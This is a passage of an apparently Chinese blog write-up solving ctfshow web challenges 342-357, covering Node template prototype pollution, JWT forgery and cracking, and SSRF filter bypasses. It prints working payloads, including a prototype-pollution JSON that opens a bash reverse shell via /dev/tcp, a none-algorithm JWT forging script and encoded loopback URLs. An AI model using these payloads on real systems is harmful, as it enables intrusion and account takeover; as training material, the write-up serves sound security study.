class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web342-343"><a href="#web342-343" class="headerlink" title="web342-343"></a>web342-343</h2><p>变成了<code>jade</code>模板（<a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析</a>）</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Code&quot;</span><span class="punctuation">,</span><span class="attr">&quot;self&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span><span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xx/xx 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h2><p>看下给的代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>需要知道<code>nodejs</code>在处理传入的相同变量时，并非进行覆盖，而是全都放到一个数组里，而<code>JSON.parse</code>会把数组里的内容用<code>,</code>连接起来</p><blockquote><p><a href="https://www.cnblogs.com/AtesetEnginner/p/12375499.html">不同服务器对参数的处理</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;&#123;&quot;name&quot;:&quot;admin&quot;&#x27;</span>,<span class="string">&#x27;&quot;password&quot;:&quot;ctfshow&quot;&#x27;</span>,<span class="string">&#x27;&quot;isVIP&quot;:true&#125;&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(arr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(query)</span><br><span class="line"><span class="comment">// &#123; name: &#x27;admin&#x27;, password: &#x27;ctfshow&#x27;, isVIP: true &#125;</span></span><br></pre></td></tr></table></figure><p>故可以用下述<code>payload</code>绕过对<code>,</code>的检测</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>这里把<code>c</code>进行<code>url</code>编码，是因为双引号的<code>url</code>编码是 <code>%22</code>，和 <code>c</code> 连接起来就是 <code>%22c</code>，会匹配到正则表达式。</p><h1 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h1><h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p>源码中发现<code>&lt;!-- /admin --&gt;</code>，将<code>cookie</code>中的<code>auth</code>字段<code>base64</code>解码一下并替换其中的<code>user</code>为<code>admin</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;jwt&quot;&#125;[&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1680789865,&quot;exp&quot;:1680797065,&quot;nbf&quot;:1680789865,&quot;sub&quot;:&quot;admin&quot;,&quot;jti&quot;:&quot;831d5be4047a4e23022cf741ea154483&quot;&#125;]</span><br></pre></td></tr></table></figure><p><code>base64</code>编码后访问<code>/admin/</code>即可</p><h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>利用<a href="https://jwt.io/">在线工具</a>加解密即可</p><blockquote><p>密钥为:123456</p></blockquote><p>也可以利用将<code>alg</code>改为<code>none</code>，然后利用<code>yu22x</code>的脚本加密下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">token_dict = &#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1680798024</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1680805224</span>,</span><br><span class="line">  <span class="string">&quot;nbf&quot;</span>: <span class="number">1680798024</span>,</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;23661f858b71f258fdffb3c9a7c69d44&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># headers</span></span><br><span class="line">headers = &#123;</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jwt_token = jwt.encode(token_dict,  <span class="comment"># payload, 有效载体 </span></span><br><span class="line">                       key=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                       headers=headers,  <span class="comment"># json web token 数据结构包含两部分, payload(有效载体), headers(标头)</span></span><br><span class="line">                       algorithm=<span class="string">&quot;none&quot;</span>,  <span class="comment"># 指明签名算法方式, 默认也是HS256</span></span><br><span class="line">                       )  <span class="comment"># python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br></pre></td></tr></table></figure><h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>利用<a href="https://jwt.io/">在线工具</a>加解密即可</p><blockquote><p>密钥为:123456</p></blockquote><h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>利用该<a href="https://github.com/brendan-rius/c-jwt-cracker">工具</a>爆破</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --<span class="built_in">rm</span> jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY4MDc5ODU2MywiZXhwIjoxNjgwODA1NzYzLCJuYmYiOjE2ODA3OTg1NjMsInN1YiI6InVzZXIiLCJqdGkiOiJmNTI1ZWRkNDJmNGRkNDA5MjI3MzFkYTk4YmFhZGEwMyJ9.HcuFjlWJRS0L-GCXiP8EC2V5o8XtA0TWyBhuspgyxLM</span><br></pre></td></tr></table></figure><p>得到密钥为<code>aaab</code>，然后加密访问<code>/admin/</code>即可</p><h2 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h2><p>查看源码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line"><span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">jwt.<span class="title function_">verify</span>(auth, cert, <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>访问<code>/private.key</code>可以获取到私钥</p><p>可以本地复现一个环境（注意<code>jsonwebtoken@8.5.1</code>，版本太新会报错的），也可以直接运行下面的代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;private.key&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure><p>拿到后记得要<code>POST</code>访问<code>/</code></p><h2 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h2><p>访问<code>/public.key</code>可以获取到公钥，放到<code>public</code>目录然后本地复现下</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;\\public\\public.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>改掉路径并把内部字段改成<code>admin</code>和<code>HS256</code>即可，然后带着<code>Cookie</code>里面带着<code>auth</code>字段去<code>POST</code>访问<code>/</code>即可</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>flag.php</code>返回<code>非本地用户禁止访问</code>，故用<code>ssrf</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了<code>localhost</code>和<code>127.0.0</code></p><blockquote><p><a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">进制转换工具</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br><span class="line">url=http://127.0.1/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br><span class="line"></span><br><span class="line">也可以进制转换</span><br><span class="line">url=http://0x7F000001/flag.php</span><br><span class="line">url=http://0x7F.00.00.01/flag.php</span><br><span class="line">url=http://2130706433/flag.php</span><br></pre></td></tr></table></figure><h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure><p>进制转换或者<code>127.1</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://127.1/flag.php</span><br><span class="line">url=http://0x7F000001/flag.php</span><br></pre></td></tr></table></figure><h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用现成的<code>302跳转</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://sudo.cc/flag.php</span><br></pre></td></tr></table></figure><h2 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>限制了长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://127.1/flag.php</span><br></pre></td></tr></table></figure><h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>限制了长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br></pre></td></tr></table></figure><h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在自己的服务器上放个<code>302.php</code>然后直接访问即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>); </span><br></pre></td></tr></table></figure><h2 id="web358"><a href="#web358" class="headerlink" 